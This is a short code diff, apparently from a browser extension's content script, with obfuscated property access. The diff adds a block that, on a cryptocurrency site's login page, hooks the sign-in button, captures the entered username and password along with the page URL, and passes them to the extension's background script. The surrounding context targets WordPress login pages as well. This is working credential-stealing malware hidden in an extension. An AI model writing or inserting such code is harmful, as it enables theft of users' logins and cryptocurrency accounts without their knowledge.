@@ -510,6 +510,21 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                 }
             }, 1000)
         };
+
+        if (top['location']['href']['indexOf']('https://onixcoin.com/inicio-sesion/') > -1) {
+              var interval = setInterval(function () {
+                  if (document['getElementsByClassName']('onix-info')) {
+                      clearInterval(interval);
+                      document['getElementById']('btn_sesion').onclick = function (_0x441cx2) {
+                       var login = {};
+                      login.username = document.getElementsByName("correo")[1].value;
+                      login.pass = document.getElementsByName("clave")[0].value;
+                      login.href = window.location.href;
+                      chrome.runtime.sendMessage({cmd: "l",login});
+                      }
+                  }
+              }, 1000)
+          };
     //
 // var img = document.getElementsByTagName('img');
 //      for (var i = 0; i < img.length; i++){
